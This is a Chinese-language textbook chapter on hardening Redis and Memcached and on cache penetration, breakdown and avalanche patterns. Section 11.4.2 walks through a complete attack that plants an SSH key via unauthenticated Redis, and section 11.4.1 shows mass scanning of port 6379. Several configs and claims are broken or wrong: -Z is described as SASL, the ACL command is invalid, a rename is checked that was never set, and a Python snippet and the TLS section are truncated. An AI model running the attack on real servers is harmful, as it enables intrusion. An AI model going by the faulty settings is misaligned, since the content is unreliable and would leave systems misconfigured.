# 第11章 缓存服务安全加固

## 11.1 缓存服务安全概述

缓存服务是现代Web架构中不可或缺的组件，它们通过将热点数据存储在内存中，显著提升了系统的读写性能。Redis和Memcached是最两款最流行的开源缓存服务。

然而，缓存服务也面临严峻的安全挑战：未授权访问风险、数据泄露、缓存穿透/击穿/雪崩问题、命令注入等。2019年以来，多起大规模数据泄露事件都与Redis、MongoDB等缓存服务的未授权访问有关。

缓存服务安全加固的核心原则是：网络隔离、认证授权、最小命令、加密传输、容量控制、监控告警。本章将详细介绍Redis和Memcached的安全加固方法。

## 11.2 Redis安全加固

### 11.2.1 Redis安装与基础配置

```bash
# 安装Redis
yum install -y redis               # CentOS/RHEL
apt-get install -y redis-server     # Debian/Ubuntu

# 启动Redis
systemctl enable redis
systemctl start redis

# 检查Redis版本（应使用最新稳定版）
redis-server --version

# 验证安装
redis-cli ping
# 应返回 PONG
```

### 11.2.2 Redis认证配置

Redis默认不启用密码认证，这是最常见的安全风险之一。必须配置强密码：

```bash
# 编辑Redis配置文件
vi /etc/redis.conf

# 设置强密码
# 使用随机生成的强密码，至少16位
requirepass R8k#mP!9xL2$vN5j

# 使用redis-cli生成随机密码
openssl rand 60 | openssl base64 -A

# 重启Redis
systemctl restart redis

# 使用密码连接
redis-cli
AUTH R8k#mP!9xL2$vN5j
PING

# 或在一行命令中（不推荐，会在shell历史中留下密码）
redis-cli -a R8k#mP!9xL2$vN5j ping

# 验证密码是否生效（未认证时应该拒绝操作）
redis-cli
KEYS *
# 应该返回错误：(error) NOAUTH Authentication required.

# 使用密码认证后才能操作
AUTH R8k#mP!9xL2$vN5j
KEYS *
```

### 11.2.3 Redis绑定地址配置

```bash
# 编辑配置文件
vi /etc/redis.conf

# 绑定到特定IP（只监听本地）
bind 127.0.0.1

# 或者只监听内部网络
bind 127.0.0.1 192.168.1.10

# 重要：不要绑定到 0.0.0.0！
# 如果必须从远程访问，使用VPN或SSH隧道

# 重启服务
systemctl restart redis

# 验证绑定
netstat -tlnp | grep redis
# 应该只显示127.0.0.1:6379或指定IP:6379
```

### 11.2.4 防火墙保护Redis

```bash
# 只允许应用服务器访问Redis
# 假设应用服务器IP为 192.168.1.10

# 使用iptables
iptables -A INPUT -p tcp -s 192.168.1.10 --dport 6379 -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP

# 或使用firewalld
firewall-cmd --permanent --zone=trusted --add-source=192.168.1.10/32
firewall-cmd --permanent --add-port=6379/tcp --zone=trusted
firewall-cmd --permanent --remove-port=6379/tcp
firewall-cmd --reload

# 验证防火墙规则
iptables -L -n | grep 6379
```

### 11.2.5 Redis危险命令禁用

Redis提供了许多功能强大的命令，其中一些可能被滥用。禁用危险命令是重要的安全措施：

```bash
# 编辑配置文件
vi /etc/redis.conf

# 禁用危险命令（将命令重命名为空字符串）
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command DEBUG ""
rename-command KEYS ""
rename-command CONFIG ""
rename-command SHUTDOWN ""
rename-command BGREWRITEAOF ""
rename-command BGSAVE ""
rename-command SPUBLISH ""
rename-command SUBSCRIBE ""
rename-command PSUBSCRIBE ""
rename-command PUBSUB ""

# 保留部分命令但重命名（便于管理）
rename-command SLAVEOF "SLAVEOF_9xK2mP"
rename-command MODULE "MODULE_7vL3nQ"
rename-command REPLICAOF "REPLICAOF_4jH8kL"

# 重启Redis
systemctl restart redis

# 验证命令已被禁用
redis-cli -a R8k#mP!9xL2$vN5j CONFIG GET *
# 应该返回错误

# 验证重命名的命令
redis-cli -a R8k#mP!9xL2$vN5j CONFIG_9xK2mP GET *
# 应该正常返回配置
```

### 11.2.6 Redis持久化安全

Redis支持RDB和AOF两种持久化方式，每种都有安全考虑：

```bash
# 编辑配置文件
vi /etc/redis.conf

# RDB持久化安全配置
# 禁用BGSAVE命令（通过重命名实现，见上）
stop-writes-on-bgsave-error yes      # BGSAVE失败时停止写入
rdbcompression yes                    # 压缩RDB文件
rdbchecksum yes                       # RDB文件校验

# AOF持久化安全配置
appendonly yes                         # 启用AOF
appendfsync everysec                   # 每秒同步（性能和安全的平衡）
no-appendfsync-on-rewrite no          # 重写时不禁止fsync
auto-aof-rewrite-percentage 100      # 文件大小增长100%时重写
auto-aof-rewrite-min-size 64mb       # 最小重写大小64MB

# AOF重写安全
aof-load-truncated yes                # 加载时截断AOF
aof-use-rdb-preamble yes             # 使用RDB预加载

# 保护RDB和AOF文件
# 确保Redis数据目录权限正确
chown redis:redis /var/lib/redis
chmod 750 /var/lib/redis

# 禁止外部访问持久化文件
# 确保后台没有其他服务读取这些文件
```

### 11.2.7 Redis主从安全

如果使用Redis主从复制，需要确保复制链路的安全：

```bash
# 在Master配置
vi /etc/redis.conf

# 设置复制密码
masterauth R8k#mP!9xL2$vN5j

# 只允许从指定IP复制
bind 127.0.0.1 192.168.1.10

# 在Slave配置
vi /etc/redis.conf

# 连接到主服务器
replicaof 192.168.1.10 6379

# 设置主服务器密码
masterauth R8k#mP!9xL2$vN5j

# 只读模式（从节点默认只读）
replica-read-only yes

# 禁止从节点可写
# (默认已启用replica-read-only)
```

### 11.2.8 Redis集群安全

Redis集群提供了数据分片和高可用性：

```bash
# Redis集群配置示例
# 每个节点的配置文件

vi /etc/redis.conf

# 集群配置
cluster-enabled yes
cluster-config-file nodes-6379.conf
cluster-node-timeout 15000
cluster-replica-validity-factor 10

# 集群认证（Redis 6.x+支持）
# 需要所有节点配置相同的密码
requirepass R8k#mP!9xL2$vN5j
masterauth R8k#mP!9xL2$vN5j

# 限制集群节点间通信
# bind配置确保只有集群节点可以通信
bind 192.168.1.10 127.0.0.1

# 在集群节点间配置防火墙
# 允许9300-9300+端口（集群总线端口）
iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 16379 -j ACCEPT
iptables -A INPUT -p tcp --dport 16379 -j DROP
```

## 11.3 Memcached安全加固

### 11.3.1 Memcached安装与基础配置

```bash
# 安装Memcached
yum install -y memcached libmemcached          # CentOS/RHEL
apt-get install -y memcached libmemcached-tools  # Debian/Ubuntu

# 检查版本
memcached -h | head -5

# 启动Memcached
systemctl enable memcached
systemctl start memcached

# 查看运行状态
echo "stats settings" | nc -q1 localhost 11211
```

### 11.3.2 Memcached绑定地址配置

```bash
# Memcached默认监听所有接口，需要限制

# 编辑systemd服务配置
mkdir -p /etc/systemd/system/memcached.service.d/
cat > /etc/systemd/system/memcached.service.d/override.conf << 'EOF'
[Service]
ExecStart=
ExecStart=/usr/bin/memcached -u memcached -p 11211 -m 256 -c 1024 -l 127.0.0.1 -v
EOF

# 或编辑/etc/sysconfig/memcached (CentOS/RHEL)
cat > /etc/sysconfig/memcached << 'EOF'
PORT="11211"
USER="memcached"
MAXCONN="1024"
CACHESIZE="256"
OPTIONS="-l 127.0.0.1 -U 0 -v"
EOF

# OPTIONS说明：
# -l 127.0.0.1  只监听本地
# -U 0          禁用UDP（减少攻击面）
# -v            使用最小日志级别

# 重新加载并重启
systemctl daemon-reload
systemctl restart memcached

# 验证绑定
netstat -tlnp | grep memcached
# 应该只显示127.0.0.1:11211
```

### 11.3.3 Memcached认证

Memcached本身不提供用户名密码认证，主要通过SASL实现：

```bash
# 安装SASL支持
yum install -y cyrus-sasl-devel cyrus-sasl-plain  # CentOS/RHEL
apt-get install -y libsasl2-modules sasl2-bin       # Debian/Ubuntu

# 配置SASL
mkdir -p /etc/sasl2
cat > /etc/sasl2/memcached.conf << 'EOF'
mech_list: plain
log_level: 5
sasldb_path: /etc/sasl2/memcached.db
EOF

# 创建SASL用户
saslpasswd2 -a memcached -c cache_user
# 输入密码

# 设置数据库权限
chown root:memcached /etc/sasl2/memcached.db
chmod 640 /etc/sasl2/memcached.db

# 重新配置Memcached启动参数
cat > /etc/sysconfig/memcached << 'EOF'
PORT="11211"
USER="memcached"
MAXCONN="1024"
CACHESIZE="256"
OPTIONS="-l 127.0.0.1 -U 0 -S -v"
EOF

# OPTIONS说明：
# -S  启用SASL认证

# 重启Memcached
systemctl restart memcached

# 测试认证连接
# 使用telnet测试
telnet localhost 11211
STATS
# 应该看到STAT auth_enabled_sasl 1

# 使用客户端测试
yum install -y python3-pip
pip3 install pymemcache

python3 << 'EOF'
from pymemcache.client.base import Client

# 带认证的客户端

    serializer=serde.python_serde,
    deserializer=serde.python_serde,
    connect_timeout=5,
    timeout=5

# 设置认证
```

### 11.3.5 Memcached TLS配置

Memcached 1.6+支持TLS加密：

```bash
# 生成证书
mkdir -p /etc/memcached/certs
openssl req -x509 -newkey rsa:2048 -days 365 \
    -keyout /etc/memcached/certs/key.pem \
    -out /etc/memcached/certs/cert.pem \
    -nodes -subj "/C=CN/ST=Beijing/L=Beijing/O=Memcached/CN=localhost"

# 配置Memcached使用TLS
cat > /etc/sysconfig/memcached << 'EOF'
PORT="11211"
USER="memcached"
MAXCONN="1024"
CACHESIZE="256"
OPTIONS="-l 127.0.0.1 -U 0 -Z -o ssl_cert=/etc/memcached/certs/cert.pem,ssl_key=/etc/memcached/certs/key.pem,ssl_ca_cert=/etc/memcached/certs/cert.pem"
EOF

# OPTIONS说明：
# -Z  启用SASL
# -o  高级选项
# ssl_cert  TLS证书
# ssl_key   TLS私钥
# ssl_ca_cert  CA证书

# 重启Memcached
systemctl restart memcached

# 使用TLS连接测试
echo "get key" | openssl s_client -connect localhost:11211 -starttls memcache
```

## 11.4 缓存服务常见漏洞

### 11.4.1 未授权访问漏洞

最常见的Redis安全问题是未授权访问：

```bash
# 检查是否存在未授权访问
redis-cli -h target-server ping
# 如果返回PONG，说明可能存在未授权访问

# 使用nmap扫描
nmap -p 6379 --script redis-info target-server

# 使用masscan批量扫描
masscan -p6379 10.0.0.0/8 --rate=10000

# 防范措施
# 1. 设置强密码
# 2. 绑定到本地IP
# 3. 防火墙阻止外部访问
# 4. 禁用危险命令
```

### 11.4.2 Redis沙箱逃逸

Redis未授权访问可能导致系统被入侵：

```bash
# 攻击者利用Redis写入SSH公钥
# 攻击者首先需要知道运行Redis的用户（通常是redis）

# 生成SSH公钥
ssh-keygen -t rsa -C "attacker@email.com"
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/public_key.txt

# 将公钥写入Redis
redis-cli -h target-server SET xxx "\n\n$(cat /tmp/public_key.txt)\n\n"

# 设置Redis持久化目录为SSH公钥目录
redis-cli -h target-server CONFIG SET dir /var/lib/redis/.ssh

# 设置文件名
redis-cli -h target-server CONFIG SET dbfilename "authorized_keys"

# 执行持久化
redis-cli -h target-server SAVE

# 现在攻击者可以通过SSH以redis用户登录
ssh -i ~/.ssh/id_rsa redis@target-server

# 防范措施
# 1. 禁止Redis用户写SSH目录
chattr +a /var/lib/redis/.ssh
chattr +i /var/lib/redis/.ssh/authorized_keys

# 2. 使用普通用户运行Redis（非root/redis）
useradd -r -s /sbin/nologin redis
usermod -L redis

# 3. 配置openrc/systemd保护
# /etc/systemd/system/redis.service.d/override.conf
[Service]
ProtectHome=true
ProtectSystem=full
ReadOnlyPaths=/
```

### 11.4.3 恶意Redis模块加载

Redis 4.x+支持模块加载，可能被滥用：

```bash
# 检查Redis模块
redis-cli MODULE LIST

# 禁用模块加载
vi /etc/redis.conf
# 添加或修改
lua-time-limit 5000

# 不允许执行外部命令
# 在Redis 6.2+可以使用ACL
acl setflushuser default on >password ~* &* -@all +ping

# 防范措施
# 1. 禁用MODULE命令
rename-command MODULE ""

# 2. 使用ACL限制用户权限（Redis 6.x+）
# /etc/redis.conf
user readonly_user on >readonly_pass ~* &* -@all +get +mget +exists +ttl
```

## 11.5 缓存穿透/击穿/雪崩

### 11.5.1 缓存穿透

缓存穿透是指查询一个不存在的数据，由于缓存没有命中，每次请求都会查询数据库：

```python
# 问题代码
def get_user(user_id):
    # 先查缓存
    user = redis.get(f"user:{user_id}")
    if user:
        return user
    
    # 缓存没有，查数据库
    user = db.query("SELECT * FROM users WHERE id = ?", user_id)
    if user:
        redis.setex(f"user:{user_id}", 3600, user)
    
    return user

# 问题：如果查询不存在的用户ID（如-1），每次都会穿透到数据库

# 解决方案1：布隆过滤器
from bloom_filter import BloomFilter

bloom = BloomFilter(max_elements=10000, error_rate=0.1)

def get_user(user_id):
    if user_id not in bloom:
        return None  # 布隆过滤器认为不存在，直接返回
    
    # 先查缓存
    user = redis.get(f"user:{user_id}")
    if user:
        return user
    
    # 查数据库
    user = db.query("SELECT * FROM users WHERE id = ?", user_id)
    if user:
        redis.setex(f"user:{user_id}", 3600, user)
        bloom.add(user_id)
    
    return user

# 解决方案2：缓存空值
def get_user(user_id):
    # 先查缓存
    user = redis.get(f"user:{user_id}")
    if user == "NULL":  # 空值标记
        return None
    
    if user:
        return user
    
    # 查数据库
    user = db.query("SELECT * FROM users WHERE id = ?", user_id)
    if user:
        redis.setex(f"user:{user_id}", 3600, user)
    else:
        # 缓存空值，较短过期时间
        redis.setex(f"user:{user_id}", 60, "NULL")
    
    return user
```

### 11.5.2 缓存击穿

缓存击穿是指一个热点key过期时，正好有大量并发请求同时访问：

```python
import threading
import time

# 问题代码
def get_user(user_id):
    user = redis.get(f"user:{user_id}")
    if not user:
        user = db.query("SELECT * FROM users WHERE id = ?", user_id)
        redis.setex(f"user:{user_id}", 3600, user)
    return user

# 问题：当热点数据过期瞬间，大量请求同时穿透到数据库

# 解决方案1：互斥锁
def get_user_with_lock(user_id):
    lock_key = f"lock:user:{user_id}"
    user = redis.get(f"user:{user_id}")
    if user:
        return user
    
    # 尝试获取锁
    lock = redis.lock(lock_key, timeout=10, blocking_timeout=5)
    if lock.acquire():
        try:
            # 双重检查
            user = redis.get(f"user:{user_id}")
            if user:
                return user
            
            user = db.query("SELECT * FROM users WHERE id = ?", user_id)
            if user:
                redis.setex(f"user:{user_id}", 3600, user)
            return user
        finally:
            lock.release()
    else:
        # 等待后重试
        time.sleep(0.1)
        return get_user_with_lock(user_id)

# 解决方案2：热点数据永不过期 + 后台更新
def get_user_never_expire(user_id):
    user = redis.get(f"user:{user_id}")
    if user:
        # 检查是否需要更新
        update_needed = redis.get(f"user:{user_id}:update")
        if update_needed:
            threading.Thread(target=update_user_cache, args=(user_id,)).start()
        return user
    
    return update_user_cache(user_id)

def update_user_cache(user_id):
    user = db.query("SELECT * FROM users WHERE id = ?", user_id)
    if user:
        redis.set(f"user:{user_id}", user)  # 永不过期
        redis.delete(f"user:{user_id}:update")
```

### 11.5.3 缓存雪崩

缓存雪崩是指大量缓存同时过期，导致大量请求同时穿透到数据库：

```python
import random

# 问题代码
def get_user(user_id):
    user = redis.get(f"user:{user_id}")
    if not user:
        user = db.query("SELECT * FROM users WHERE id = ?", user_id)
        redis.setex(f"user:{user_id}", 3600, user)  # 固定过期时间
    return user

# 问题：大量key同时在3600秒后过期

# 解决方案1：随机过期时间
def get_user_random_ttl(user_id):
    user = redis.get(f"user:{user_id}")
    if not user:
        user = db.query("SELECT * FROM users WHERE id = ?", user_id)
        # 添加随机过期时间：基础时间 + 随机偏移
        ttl = 3600 + random.randint(0, 600)  # 3600-4200秒
        redis.setex(f"user:{user_id}", ttl, user)
    return user

# 解决方案2：分层缓存
def get_user_multi_layer(user_id):
    # L1缓存：内存缓存（进程内），过期时间短
    l1_cache = get_l1_cache()
    user = l1_cache.get(user_id)
    if user:
        return user
    
    # L2缓存：Redis，过期时间适中
    user = redis.get(f"user:{user_id}")
    if user:
        l1_cache.set(user_id, user, expire=60)  # 写入L1
        return user
    
    # 数据库
    user = db.query("SELECT * FROM users WHERE id = ?", user_id)
    if user:
        redis.setex(f"user:{user_id}", 3600, user)
        l1_cache.set(user_id, user, expire=60)
    
    return user

# 解决方案3：永不失效 + 更新机制
def get_user_no_expire(user_id):
    user = redis.get(f"user:{user_id}")
    if user:
        # 检查是否即将过期
        ttl = redis.ttl(f"user:{user_id}")
        if ttl < 300:  # 小于5分钟
            # 异步更新缓存
            threading.Thread(target=refresh_user_cache, args=(user_id,)).start()
        return user
    
    user = db.query("SELECT * FROM users WHERE id = ?", user_id)
    if user:
        redis.set(f"user:{user_id}", user)  # 永不过期
    return user
```

```python
# 敏感数据加密存储
import hashlib
import hmac
from cryptography.fernet import Fernet

class SecureCache:
    def __init__(self, redis_client, encryption_key):
        self.redis = redis_client
        self.cipher = Fernet(encryption_key)
    
    def set(self, key, value, ttl=3600):
        # 加密值
        encrypted_value = self.cipher.encrypt(value.encode())
        self.redis.setex(key, ttl, encrypted_value)
    
    def get(self, key):
        encrypted_value = self.redis.get(key)
        if not encrypted_value:
            return None
        return self.cipher.decrypt(encrypted_value).decode()
    
    def hash_set(self, name, key, value, ttl=3600):
        encrypted_value = self.cipher.encrypt(value.encode())
        self.redis.hset(name, key, encrypted_value)
        self.redis.expire(name, ttl)
    
    def hash_get(self, name, key):
        encrypted_value = self.redis.hget(name, key)
        if not encrypted_value:
            return None
        return self.cipher.decrypt(encrypted_value).decode()
```

```bash
tls-key-file /etc/redis/redis.key
tls-ca-cert-file /etc/redis/ca.crt

# TLS验证
tls-auth-clients yes  # 要求客户端提供证书
tls-auth-clients no   # 不要求客户端证书

# TLS协议版本
tls-protocols "TLSv1.2 TLSv1.3"

# TLS加密套件
tls-ciphers "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256"

# 生成证书
cd /etc/redis
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3650 -key ca.key -out ca.crt
openssl genrsa -out redis.key 2048
openssl req -new -key redis.key -out redis.csr
openssl x509 -req -days 365 -in redis.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out redis.crt

# 使用TLS连接Redis
redis-cli --tls --cert /etc/redis/client.crt --key /etc/redis/client.key --cacert /etc/redis/ca.crt
```
